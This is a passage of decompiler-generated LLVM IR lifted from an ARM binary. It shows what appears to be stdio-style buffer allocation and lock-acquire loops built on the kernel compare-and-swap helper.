  store i32 %v4_1b8d0, i32* %r3.global-to-local, align 4
  %v0_1b8d4 = load i32, i32* @r4, align 4
  %v1_1b8d4 = load i32, i32* @r6, align 4
  %v3_1b8d4 = add i32 %v1_1b8d4, %v4_1b8d0
  %v4_1b8d4 = inttoptr i32 %v3_1b8d4 to i32*
  store i32 %v0_1b8d4, i32* %v4_1b8d4, align 4
  br label %dec_label_pc_1b8d8

dec_label_pc_1b8d8:                               ; preds = %bb55, %.thread5
  %v0_1b8d8 = load i32, i32* @r5, align 4
  %v1_1b8d8 = add i32 %v0_1b8d8, 8
  %v2_1b8d8 = inttoptr i32 %v1_1b8d8 to i32*
  %v3_1b8d8 = load i32, i32* %v2_1b8d8, align 4
  store i32 %v3_1b8d8, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1b8dc = icmp eq i32 %v3_1b8d8, 0
  br i1 %v2_1b8dc, label %dec_label_pc_1b8e4, label %bb57

dec_label_pc_1b8e4:                               ; preds = %dec_label_pc_1b8d8
  store i32 4096, i32* %r0.global-to-local, align 4
  %v1_1b8e8 = call i32 @malloc(i32 4096)
  store i32 %v1_1b8e8, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1b8ec = icmp eq i32 %v1_1b8e8, 0
  %v1_1b8fc.pre = load i32, i32* @r5, align 4
  br i1 %v2_1b8ec, label %.thread9, label %.thread8

.thread8:                                         ; preds = %dec_label_pc_1b8e4
  %v2_1b8f0 = inttoptr i32 %v1_1b8fc.pre to i16*
  %v3_1b8f0 = load i16, i16* %v2_1b8f0, align 2
  %v4_1b8f0 = zext i16 %v3_1b8f0 to i32
  %v2_1b8f4 = add i32 %v1_1b8e8, 4096
  store i32 %v2_1b8f4, i32* %r2.global-to-local, align 4
  %v2_1b8f8 = or i32 %v4_1b8f0, 16384
  store i32 %v2_1b8f8, i32* %r3.global-to-local, align 4
  %v2_1b8fc = add i32 %v1_1b8fc.pre, 8
  %v3_1b8fc = inttoptr i32 %v2_1b8fc to i32*
  store i32 %v1_1b8e8, i32* %v3_1b8fc, align 4
  %v1_1b900 = load i32, i32* %r2.global-to-local, align 4
  %v2_1b900 = load i32, i32* @r5, align 4
  %v3_1b900 = add i32 %v2_1b900, 12
  %v4_1b900 = inttoptr i32 %v3_1b900 to i32*
  store i32 %v1_1b900, i32* %v4_1b900, align 4
  %v1_1b904 = load i32, i32* %r3.global-to-local, align 4
  %v2_1b904 = trunc i32 %v1_1b904 to i16
  %v3_1b904 = load i32, i32* @r5, align 4
  %v4_1b904 = inttoptr i32 %v3_1b904 to i16*
  store i16 %v2_1b904, i16* %v4_1b904, align 2
  br label %bb57

.thread9:                                         ; preds = %dec_label_pc_1b8e4
  %v2_1b8fc37 = add i32 %v1_1b8fc.pre, 8
  %v3_1b8fc38 = inttoptr i32 %v2_1b8fc37 to i32*
  store i32 0, i32* %v3_1b8fc38, align 4
  %v2_1b908 = load i32, i32* @r5, align 4
  %v3_1b908 = add i32 %v2_1b908, 12
  %v4_1b908 = inttoptr i32 %v3_1b908 to i32*
  store i32 0, i32* %v4_1b908, align 4
  br label %bb57

bb57:                                             ; preds = %.thread8, %dec_label_pc_1b8d8, %.thread9
  store i32 104, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v0_1b914 = load i32, i32* @r8, align 4
  %v2_1b914 = add i32 %v0_1b914, 104
  %v3_1b914 = inttoptr i32 %v2_1b914 to i32*
  %v4_1b914 = load i32, i32* %v3_1b914, align 4
  store i32 %v4_1b914, i32* %r3.global-to-local, align 4
  %v2_1b918 = load i32, i32* @r5, align 4
  %v3_1b918 = add i32 %v2_1b918, 2
  %v4_1b918 = inttoptr i32 %v3_1b918 to i8*
  store i8 0, i8* %v4_1b918, align 1
  %v0_1b91c = load i32, i32* @r5, align 4
  %v1_1b91c = inttoptr i32 %v0_1b91c to i16*
  %v2_1b91c = load i16, i16* %v1_1b91c, align 2
  %v3_1b91c = zext i16 %v2_1b91c to i32
  store i32 %v3_1b91c, i32* @r2, align 4
  %v0_1b920 = load i32, i32* %r3.global-to-local, align 4
  %v1_1b920 = inttoptr i32 %v0_1b920 to i32*
  %v2_1b920 = load i32, i32* %v1_1b920, align 4
  store i32 %v2_1b920, i32* @r1, align 4
  %v1_1b924 = add i32 %v0_1b91c, 8
  %v2_1b924 = inttoptr i32 %v1_1b924 to i32*
  %v3_1b924 = load i32, i32* %v2_1b924, align 4
  store i32 %v3_1b924, i32* %r3.global-to-local, align 4
  %v1_1b928 = and i32 %v3_1b91c, 8192
  %v2_1b928 = icmp eq i32 %v1_1b928, 0
  %v2_1b92c = add i32 %v0_1b91c, 20
  %v3_1b92c = inttoptr i32 %v2_1b92c to i32*
  store i32 %v3_1b924, i32* %v3_1b92c, align 4
  %v0_1b930 = load i32, i32* @r1, align 4
  %v1_1b930 = load i32, i32* @r5, align 4
  %v2_1b930 = add i32 %v1_1b930, 52
  %v3_1b930 = inttoptr i32 %v2_1b930 to i32*
  store i32 %v0_1b930, i32* %v3_1b930, align 4
  %v0_1b934 = load i32, i32* %r3.global-to-local, align 4
  %v1_1b934 = load i32, i32* @r5, align 4
  %v2_1b934 = add i32 %v1_1b934, 24
  %v3_1b934 = inttoptr i32 %v2_1b934 to i32*
  store i32 %v0_1b934, i32* %v3_1b934, align 4
  %v0_1b938 = load i32, i32* %r3.global-to-local, align 4
  %v1_1b938 = load i32, i32* @r5, align 4
  %v2_1b938 = add i32 %v1_1b938, 28
  %v3_1b938 = inttoptr i32 %v2_1b938 to i32*
  store i32 %v0_1b938, i32* %v3_1b938, align 4
  %v0_1b93c = load i32, i32* %r3.global-to-local, align 4
  %v1_1b93c = load i32, i32* @r5, align 4
  %v2_1b93c = add i32 %v1_1b93c, 16
  %v3_1b93c = inttoptr i32 %v2_1b93c to i32*
  store i32 %v0_1b93c, i32* %v3_1b93c, align 4
  %v0_1b940 = load i32, i32* %r4.global-to-local, align 4
  %v1_1b940 = load i32, i32* @r5, align 4
  %v2_1b940 = add i32 %v1_1b940, 44
  %v3_1b940 = inttoptr i32 %v2_1b940 to i32*
  store i32 %v0_1b940, i32* %v3_1b940, align 4
  br i1 %v2_1b928, label %dec_label_pc_1bb28, label %dec_label_pc_1b948

dec_label_pc_1b948:                               ; preds = %bb57
  store i32 176, i32* %r3.global-to-local, align 4
  %v0_1b94c = load i32, i32* @r8, align 4
  %v2_1b94c = add i32 %v0_1b94c, 176
  %v3_1b94c = inttoptr i32 %v2_1b94c to i32*
  %v4_1b94c = load i32, i32* %v3_1b94c, align 4
  store i32 %v4_1b94c, i32* %r7.global-to-local, align 4
  %v0_1b950 = call i32 @__aeabi_read_tp()
  store i32 %v0_1b950, i32* %r0.global-to-local, align 4
  %v1_1b954 = add i32 %v4_1b94c, 8
  %v2_1b954 = inttoptr i32 %v1_1b954 to i32*
  %v3_1b954 = load i32, i32* %v2_1b954, align 4
  store i32 %v3_1b954, i32* %r3.global-to-local, align 4
  %v1_1b958 = add i32 %v0_1b950, -1168
  store i32 %v1_1b958, i32* %r6.global-to-local, align 4
  %v3_1b95c = icmp uge i32 %v3_1b954, %v1_1b958
  store i1 %v3_1b95c, i1* %cpsr_c.global-to-local, align 1
  %v9_1b95c = icmp eq i32 %v3_1b954, %v1_1b958
  br i1 %v9_1b95c, label %dec_label_pc_1b9a0, label %dec_label_pc_1b964

dec_label_pc_1b964:                               ; preds = %dec_label_pc_1b948
  store i32 %v4_1b94c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1b96c

dec_label_pc_1b96c:                               ; preds = %dec_label_pc_1b978.dec_label_pc_1b96c_crit_edge, %dec_label_pc_1b964
  %v0_1b96c = phi i32 [ %v0_1b96c.pre, %dec_label_pc_1b978.dec_label_pc_1b96c_crit_edge ], [ %v4_1b94c, %dec_label_pc_1b964 ]
  %v1_1b96c = inttoptr i32 %v0_1b96c to i32*
  %v2_1b96c = load i32, i32* %v1_1b96c, align 4
  store i32 %v2_1b96c, i32* %r3.global-to-local, align 4
  %v1_1b970 = load i32, i32* %r4.global-to-local, align 4
  %v3_1b970 = icmp uge i32 %v2_1b96c, %v1_1b970
  store i1 %v3_1b970, i1* %cpsr_c.global-to-local, align 1
  %v9_1b970 = icmp eq i32 %v2_1b96c, %v1_1b970
  br i1 %v9_1b970, label %dec_label_pc_1b978, label %dec_label_pc_1b990

dec_label_pc_1b978:                               ; preds = %dec_label_pc_1b96c
  store i32 %v2_1b96c, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1b988 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1b988, label %dec_label_pc_1b98c, label %dec_label_pc_1b978.dec_label_pc_1b96c_crit_edge

dec_label_pc_1b978.dec_label_pc_1b96c_crit_edge:  ; preds = %dec_label_pc_1b978
  %v0_1b96c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1b96c

dec_label_pc_1b98c:                               ; preds = %dec_label_pc_1b978
  %v0_1b98c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1b98c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1b990

dec_label_pc_1b990:                               ; preds = %dec_label_pc_1b96c, %dec_label_pc_1b98c
  %v0_1b990 = phi i32 [ %v0_1b98c, %dec_label_pc_1b98c ], [ %v2_1b96c, %dec_label_pc_1b96c ]
  %v1_1b990 = phi i32 [ %v0_1b98c, %dec_label_pc_1b98c ], [ %v1_1b970, %dec_label_pc_1b96c ]
  %v3_1b990 = icmp uge i32 %v0_1b990, %v1_1b990
  store i1 %v3_1b990, i1* %cpsr_c.global-to-local, align 1
  %v9_1b990 = icmp eq i32 %v0_1b990, %v1_1b990
  br i1 %v9_1b990, label %bb59, label %bb58

bb58:                                             ; preds = %dec_label_pc_1b990
  %v1_1b994 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_1b994, i32* %r0.global-to-local, align 4
  br label %bb59

bb59:                                             ; preds = %dec_label_pc_1b990, %bb58
  %v1_1b998 = xor i1 %v9_1b990, true
  call void @__pseudo_cond_branch(i1 %v1_1b998, i32 ptrtoint (i32* @global_var_1907c.1373 to i32))
  %v0_1b99c = load i32, i32* %r6.global-to-local, align 4
  %v1_1b99c = load i32, i32* %r7.global-to-local, align 4
  %v2_1b99c = add i32 %v1_1b99c, 8
  %v3_1b99c = inttoptr i32 %v2_1b99c to i32*
  store i32 %v0_1b99c, i32* %v3_1b99c, align 4
  %v1_1b9bc.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1b9a0

dec_label_pc_1b9a0:                               ; preds = %dec_label_pc_1b948, %bb59
  %v1_1b9bc = phi i32 [ %v3_1b954, %dec_label_pc_1b948 ], [ %v1_1b9bc.pre, %bb59 ]
  store i32 176, i32* %r3.global-to-local, align 4
  %v0_1b9a4 = load i32, i32* @r8, align 4
  %v2_1b9a4 = add i32 %v0_1b9a4, 176
  %v3_1b9a4 = inttoptr i32 %v2_1b9a4 to i32*
  %v4_1b9a4 = load i32, i32* %v3_1b9a4, align 4
  store i32 168, i32* %r3.global-to-local, align 4
  %v2_1b9ac = add i32 %v0_1b9a4, 168
  %v3_1b9ac = inttoptr i32 %v2_1b9ac to i32*
  %v4_1b9ac = load i32, i32* %v3_1b9ac, align 4
  store i32 %v4_1b9ac, i32* %r7.global-to-local, align 4
  %v1_1b9b0 = add i32 %v4_1b9a4, 4
  %v2_1b9b0 = inttoptr i32 %v1_1b9b0 to i32*
  %v3_1b9b0 = load i32, i32* %v2_1b9b0, align 4
  store i32 %v3_1b9b0, i32* %r3.global-to-local, align 4
  %v1_1b9b4 = add i32 %v4_1b9ac, 8
  %v2_1b9b4 = inttoptr i32 %v1_1b9b4 to i32*
  %v3_1b9b4 = load i32, i32* %v2_1b9b4, align 4
  store i32 %v3_1b9b4, i32* %r2.global-to-local, align 4
  %v1_1b9b8 = add i32 %v3_1b9b0, 1
  store i32 %v1_1b9b8, i32* %r3.global-to-local, align 4
  %v3_1b9bc = icmp uge i32 %v3_1b9b4, %v1_1b9bc
  store i1 %v3_1b9bc, i1* %cpsr_c.global-to-local, align 1
  %v9_1b9bc = icmp eq i32 %v3_1b9b4, %v1_1b9bc
  store i32 %v1_1b9b8, i32* %v2_1b9b0, align 4
  br i1 %v9_1b9bc, label %dec_label_pc_1ba08, label %dec_label_pc_1b9c8

dec_label_pc_1b9c8:                               ; preds = %dec_label_pc_1b9a0
  %v0_1b9cc = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_1b9cc, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_1b9d495 = inttoptr i32 %v0_1b9cc to i32*
  %v2_1b9d496 = load i32, i32* %v1_1b9d495, align 4
  store i32 %v2_1b9d496, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1b9d898 = icmp eq i32 %v2_1b9d496, 0
  br i1 %v9_1b9d898, label %dec_label_pc_1b9e0, label %dec_label_pc_1b9f8

dec_label_pc_1b9e0:                               ; preds = %dec_label_pc_1b9c8, %dec_label_pc_1b9e0.dec_label_pc_1b9d4_crit_edge
  %v0_1b9e099 = phi i32 [ %v1_1b9d8.pre, %dec_label_pc_1b9e0.dec_label_pc_1b9d4_crit_edge ], [ 0, %dec_label_pc_1b9c8 ]
  store i32 %v0_1b9e099, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1b9f0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1b9f0, label %dec_label_pc_1b9f4, label %dec_label_pc_1b9e0.dec_label_pc_1b9d4_crit_edge

dec_label_pc_1b9e0.dec_label_pc_1b9d4_crit_edge:  ; preds = %dec_label_pc_1b9e0
  %v0_1b9d4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1b9d8.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1b9d4 = inttoptr i32 %v0_1b9d4.pre to i32*
  %v2_1b9d4 = load i32, i32* %v1_1b9d4, align 4
  store i32 %v2_1b9d4, i32* %r3.global-to-local, align 4
  %v3_1b9d8 = icmp uge i32 %v2_1b9d4, %v1_1b9d8.pre
  store i1 %v3_1b9d8, i1* %cpsr_c.global-to-local, align 1
  %v9_1b9d8 = icmp eq i32 %v2_1b9d4, %v1_1b9d8.pre
  br i1 %v9_1b9d8, label %dec_label_pc_1b9e0, label %dec_label_pc_1b9f8

dec_label_pc_1b9f4:                               ; preds = %dec_label_pc_1b9e0
  %v0_1b9f4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1b9f4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1b9f8

dec_label_pc_1b9f8:                               ; preds = %dec_label_pc_1b9c8, %dec_label_pc_1b9e0.dec_label_pc_1b9d4_crit_edge, %dec_label_pc_1b9f4
  %v0_1b9f8 = phi i32 [ %v0_1b9f4, %dec_label_pc_1b9f4 ], [ %v2_1b9d496, %dec_label_pc_1b9c8 ], [ %v2_1b9d4, %dec_label_pc_1b9e0.dec_label_pc_1b9d4_crit_edge ]
  %v1_1b9f8 = phi i32 [ %v0_1b9f4, %dec_label_pc_1b9f4 ], [ 0, %dec_label_pc_1b9c8 ], [ %v1_1b9d8.pre, %dec_label_pc_1b9e0.dec_label_pc_1b9d4_crit_edge ]
  %v3_1b9f8 = icmp uge i32 %v0_1b9f8, %v1_1b9f8
  store i1 %v3_1b9f8, i1* %cpsr_c.global-to-local, align 1
  %v9_1b9f8 = icmp eq i32 %v0_1b9f8, %v1_1b9f8
  br i1 %v9_1b9f8, label %bb61, label %bb60

bb60:                                             ; preds = %dec_label_pc_1b9f8
  %v1_1b9fc = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_1b9fc, i32* %r0.global-to-local, align 4
  br label %bb61

bb61:                                             ; preds = %dec_label_pc_1b9f8, %bb60
  %v1_1ba00 = xor i1 %v9_1b9f8, true
  call void @__pseudo_cond_branch(i1 %v1_1ba00, i32 ptrtoint (i32* @global_var_1907c.1373 to i32))
  %v0_1ba04 = load i32, i32* %r6.global-to-local, align 4
  %v1_1ba04 = load i32, i32* %r7.global-to-local, align 4
  %v2_1ba04 = add i32 %v1_1ba04, 8
  %v3_1ba04 = inttoptr i32 %v2_1ba04 to i32*
  store i32 %v0_1ba04, i32* %v3_1ba04, align 4
  br label %dec_label_pc_1ba08

dec_label_pc_1ba08:                               ; preds = %dec_label_pc_1b9a0, %bb61
  store i32 168, i32* %r3.global-to-local, align 4
  %v0_1ba0c = load i32, i32* @r8, align 4
  %v2_1ba0c = add i32 %v0_1ba0c, 168
  %v3_1ba0c = inttoptr i32 %v2_1ba0c to i32*
  %v4_1ba0c = load i32, i32* %v3_1ba0c, align 4
  store i32 %v4_1ba0c, i32* %r0.global-to-local, align 4
  store i32 88, i32* %r3.global-to-local, align 4
  %v2_1ba14 = add i32 %v0_1ba0c, 88
  %v3_1ba14 = inttoptr i32 %v2_1ba14 to i32*
  %v4_1ba14 = load i32, i32* %v3_1ba14, align 4
  store i32 %v4_1ba14, i32* @r1, align 4
  %v1_1ba18 = add i32 %v4_1ba0c, 4
  %v2_1ba18 = inttoptr i32 %v1_1ba18 to i32*
  %v3_1ba18 = load i32, i32* %v2_1ba18, align 4
  store i32 %v3_1ba18, i32* %r3.global-to-local, align 4
  %v1_1ba1c = inttoptr i32 %v4_1ba14 to i32*
  %v2_1ba1c = load i32, i32* %v1_1ba1c, align 4
  store i32 %v2_1ba1c, i32* @r2, align 4
  %v1_1ba20 = add i32 %v3_1ba18, 1
  store i32 %v1_1ba20, i32* %r3.global-to-local, align 4
  store i32 %v1_1ba20, i32* %v2_1ba18, align 4
  %v0_1ba28 = load i32, i32* @r2, align 4
  %v1_1ba28 = load i32, i32* @r5, align 4
  %v2_1ba28 = add i32 %v1_1ba28, 32
  %v3_1ba28 = inttoptr i32 %v2_1ba28 to i32*
  store i32 %v0_1ba28, i32* %v3_1ba28, align 4
  %v0_1ba2c = load i32, i32* %r0.global-to-local, align 4
  %v1_1ba2c = add i32 %v0_1ba2c, 4
  %v2_1ba2c = inttoptr i32 %v1_1ba2c to i32*
  %v3_1ba2c = load i32, i32* %v2_1ba2c, align 4
  %v1_1ba30 = add i32 %v3_1ba2c, -1
  store i32 %v1_1ba30, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1ba34 = icmp eq i32 %v1_1ba30, 0
  %v0_1ba38 = load i32, i32* @r5, align 4
  %v1_1ba38 = load i32, i32* @r1, align 4
  %v2_1ba38 = inttoptr i32 %v1_1ba38 to i32*
  store i32 %v0_1ba38, i32* %v2_1ba38, align 4
  %v0_1ba3c = load i32, i32* %r3.global-to-local, align 4
  %v1_1ba3c = load i32, i32* %r0.global-to-local, align 4
  %v2_1ba3c = add i32 %v1_1ba3c, 4
  %v3_1ba3c = inttoptr i32 %v2_1ba3c to i32*
  store i32 %v0_1ba3c, i32* %v3_1ba3c, align 4
  br i1 %v2_1ba34, label %dec_label_pc_1ba44, label %dec_label_pc_1baa4

dec_label_pc_1ba44:                               ; preds = %dec_label_pc_1ba08
  %v0_1ba44 = load i32, i32* %r3.global-to-local, align 4
  %v1_1ba44 = load i32, i32* %r0.global-to-local, align 4
  %v2_1ba44 = add i32 %v1_1ba44, 8
  %v3_1ba44 = inttoptr i32 %v2_1ba44 to i32*
  store i32 %v0_1ba44, i32* %v3_1ba44, align 4
  %v0_1ba48 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1ba48, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1ba4c

dec_label_pc_1ba4c:                               ; preds = %dec_label_pc_1ba7c.dec_label_pc_1ba4c_crit_edge, %dec_label_pc_1ba44
  %v0_1ba4c = phi i32 [ %v0_1ba4c.pre, %dec_label_pc_1ba7c.dec_label_pc_1ba4c_crit_edge ], [ %v0_1ba48, %dec_label_pc_1ba44 ]
  %v1_1ba4c = inttoptr i32 %v0_1ba4c to i32*
  %v2_1ba4c = load i32, i32* %v1_1ba4c, align 4
  store i32 %v2_1ba4c, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_1ba4c, i32* @r2, align 4
  %v2_1ba5883 = load i32, i32* %v1_1ba4c, align 4
  store i32 %v2_1ba5883, i32* %r3.global-to-local, align 4
  %v3_1ba5c85 = icmp uge i32 %v2_1ba5883, %v2_1ba4c
  store i1 %v3_1ba5c85, i1* %cpsr_c.global-to-local, align 1
  %v9_1ba5c91 = icmp eq i32 %v2_1ba5883, %v2_1ba4c
  br i1 %v9_1ba5c91, label %dec_label_pc_1ba64, label %dec_label_pc_1ba7c

dec_label_pc_1ba64:                               ; preds = %dec_label_pc_1ba4c, %dec_label_pc_1ba64.dec_label_pc_1ba58_crit_edge
  %v0_1ba6492 = phi i32 [ %v1_1ba5c.pre, %dec_label_pc_1ba64.dec_label_pc_1ba58_crit_edge ], [ %v2_1ba4c, %dec_label_pc_1ba4c ]
  store i32 %v0_1ba6492, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1ba74 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1ba74, label %dec_label_pc_1ba78, label %dec_label_pc_1ba64.dec_label_pc_1ba58_crit_edge

dec_label_pc_1ba64.dec_label_pc_1ba58_crit_edge:  ; preds = %dec_label_pc_1ba64
  %v0_1ba58.pre = load i32, i32* @r2, align 4
  %v1_1ba5c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1ba58 = inttoptr i32 %v0_1ba58.pre to i32*
  %v2_1ba58 = load i32, i32* %v1_1ba58, align 4
  store i32 %v2_1ba58, i32* %r3.global-to-local, align 4
  %v3_1ba5c = icmp uge i32 %v2_1ba58, %v1_1ba5c.pre
  store i1 %v3_1ba5c, i1* %cpsr_c.global-to-local, align 1
  %v9_1ba5c = icmp eq i32 %v2_1ba58, %v1_1ba5c.pre
  br i1 %v9_1ba5c, label %dec_label_pc_1ba64, label %dec_label_pc_1ba7c

dec_label_pc_1ba78:                               ; preds = %dec_label_pc_1ba64
  %v0_1ba78 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1ba78, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1ba7c

dec_label_pc_1ba7c:                               ; preds = %dec_label_pc_1ba4c, %dec_label_pc_1ba64.dec_label_pc_1ba58_crit_edge, %dec_label_pc_1ba78
  %v0_1ba84 = phi i32 [ %v0_1ba78, %dec_label_pc_1ba78 ], [ %v2_1ba5883, %dec_label_pc_1ba4c ], [ %v2_1ba58, %dec_label_pc_1ba64.dec_label_pc_1ba58_crit_edge ]
  %v1_1ba7c = phi i32 [ %v0_1ba78, %dec_label_pc_1ba78 ], [ %v2_1ba4c, %dec_label_pc_1ba4c ], [ %v1_1ba5c.pre, %dec_label_pc_1ba64.dec_label_pc_1ba58_crit_edge ]
  %v3_1ba7c = icmp uge i32 %v0_1ba84, %v1_1ba7c
  store i1 %v3_1ba7c, i1* %cpsr_c.global-to-local, align 1
  %v9_1ba7c = icmp eq i32 %v0_1ba84, %v1_1ba7c
  br i1 %v9_1ba7c, label %dec_label_pc_1ba84, label %dec_label_pc_1ba7c.dec_label_pc_1ba4c_crit_edge

dec_label_pc_1ba7c.dec_label_pc_1ba4c_crit_edge:  ; preds = %dec_label_pc_1ba7c
  %v0_1ba4c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1ba4c

dec_label_pc_1ba84:                               ; preds = %dec_label_pc_1ba7c
  %v2_1ba84 = icmp ne i32 %v1_1ba7c, 0
  store i1 %v2_1ba84, i1* %cpsr_c.global-to-local, align 1
  %v7_1ba88 = icmp slt i32 %v1_1ba7c, 2
  br i1 %v7_1ba88, label %dec_label_pc_1baa4, label %dec_label_pc_1ba8c

dec_label_pc_1ba8c:                               ; preds = %dec_label_pc_1ba84
  %v0_1ba8c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_1ba8c, i32* %r0.global-to-local, align 4
  %v0_1ba90 = load i32, i32* @r1, align 4
  %v1_1ba90 = add i32 %v0_1ba90, 129
  store i32 %v1_1ba90, i32* @r1, align 4
  store i32 1, i32* @r2, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1baa4

dec_label_pc_1baa4:                               ; preds = %dec_label_pc_1ba08, %dec_label_pc_1ba8c, %dec_label_pc_1ba84
  store i32 176, i32* %r3.global-to-local, align 4
  %v0_1baa8 = load i32, i32* @r8, align 4
  %v2_1baa8 = add i32 %v0_1baa8, 176
  %v3_1baa8 = inttoptr i32 %v2_1baa8 to i32*
  %v4_1baa8 = load i32, i32* %v3_1baa8, align 4
  store i32 %v4_1baa8, i32* %r0.global-to-local, align 4
  %v1_1baac = add i32 %v4_1baa8, 4
  %v2_1baac = inttoptr i32 %v1_1baac to i32*
  %v3_1baac = load i32, i32* %v2_1baac, align 4
  %v1_1bab0 = add i32 %v3_1baac, -1
  store i32 %v1_1bab0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1bab4 = icmp eq i32 %v1_1bab0, 0
  store i32 %v1_1bab0, i32* %v2_1baac, align 4
  br i1 %v2_1bab4, label %dec_label_pc_1bac0, label %dec_label_pc_1bb28

dec_label_pc_1bac0:                               ; preds = %dec_label_pc_1baa4
  %v0_1bac0 = load i32, i32* %r3.global-to-local, align 4
  %v1_1bac0 = load i32, i32* %r0.global-to-local, align 4
  %v2_1bac0 = add i32 %v1_1bac0, 8
  %v3_1bac0 = inttoptr i32 %v2_1bac0 to i32*
  store i32 %v0_1bac0, i32* %v3_1bac0, align 4
  %v0_1bac4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1bac4, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1bac8

dec_label_pc_1bac8:                               ; preds = %dec_label_pc_1baf8.dec_label_pc_1bac8_crit_edge, %dec_label_pc_1bac0
  %v0_1bac8 = phi i32 [ %v0_1bac8.pre, %dec_label_pc_1baf8.dec_label_pc_1bac8_crit_edge ], [ %v0_1bac4, %dec_label_pc_1bac0 ]
  %v1_1bac8 = inttoptr i32 %v0_1bac8 to i32*
  %v2_1bac8 = load i32, i32* %v1_1bac8, align 4
  store i32 %v2_1bac8, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_1bac8, i32* @r2, align 4
  %v2_1bad471 = load i32, i32* %v1_1bac8, align 4
  store i32 %v2_1bad471, i32* %r3.global-to-local, align 4
  %v3_1bad873 = icmp uge i32 %v2_1bad471, %v2_1bac8
  store i1 %v3_1bad873, i1* %cpsr_c.global-to-local, align 1
  %v9_1bad879 = icmp eq i32 %v2_1bad471, %v2_1bac8
  br i1 %v9_1bad879, label %dec_label_pc_1bae0, label %dec_label_pc_1baf8

dec_label_pc_1bae0:                               ; preds = %dec_label_pc_1bac8, %dec_label_pc_1bae0.dec_label_pc_1bad4_crit_edge
  %v0_1bae080 = phi i32 [ %v1_1bad8.pre, %dec_label_pc_1bae0.dec_label_pc_1bad4_crit_edge ], [ %v2_1bac8, %dec_label_pc_1bac8 ]
  store i32 %v0_1bae080, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1baf0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1baf0, label %dec_label_pc_1baf4, label %dec_label_pc_1bae0.dec_label_pc_1bad4_crit_edge

dec_label_pc_1bae0.dec_label_pc_1bad4_crit_edge:  ; preds = %dec_label_pc_1bae0
  %v0_1bad4.pre = load i32, i32* @r2, align 4
  %v1_1bad8.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1bad4 = inttoptr i32 %v0_1bad4.pre to i32*
  %v2_1bad4 = load i32, i32* %v1_1bad4, align 4
  store i32 %v2_1bad4, i32* %r3.global-to-local, align 4
  %v3_1bad8 = icmp uge i32 %v2_1bad4, %v1_1bad8.pre
  store i1 %v3_1bad8, i1* %cpsr_c.global-to-local, align 1
  %v9_1bad8 = icmp eq i32 %v2_1bad4, %v1_1bad8.pre
  br i1 %v9_1bad8, label %dec_label_pc_1bae0, label %dec_label_pc_1baf8

dec_label_pc_1baf4:                               ; preds = %dec_label_pc_1bae0
  %v0_1baf4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1baf4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1baf8

dec_label_pc_1baf8:                               ; preds = %dec_label_pc_1bac8, %dec_label_pc_1bae0.dec_label_pc_1bad4_crit_edge, %dec_label_pc_1baf4
  %v0_1bb00 = phi i32 [ %v0_1baf4, %dec_label_pc_1baf4 ], [ %v2_1bad471, %dec_label_pc_1bac8 ], [ %v2_1bad4, %dec_label_pc_1bae0.dec_label_pc_1bad4_crit_edge ]
  %v1_1baf8 = phi i32 [ %v0_1baf4, %dec_label_pc_1baf4 ], [ %v2_1bac8, %dec_label_pc_1bac8 ], [ %v1_1bad8.pre, %dec_label_pc_1bae0.dec_label_pc_1bad4_crit_edge ]
  %v3_1baf8 = icmp uge i32 %v0_1bb00, %v1_1baf8
  store i1 %v3_1baf8, i1* %cpsr_c.global-to-local, align 1
  %v9_1baf8 = icmp eq i32 %v0_1bb00, %v1_1baf8
  br i1 %v9_1baf8, label %dec_label_pc_1bb00, label %dec_label_pc_1baf8.dec_label_pc_1bac8_crit_edge

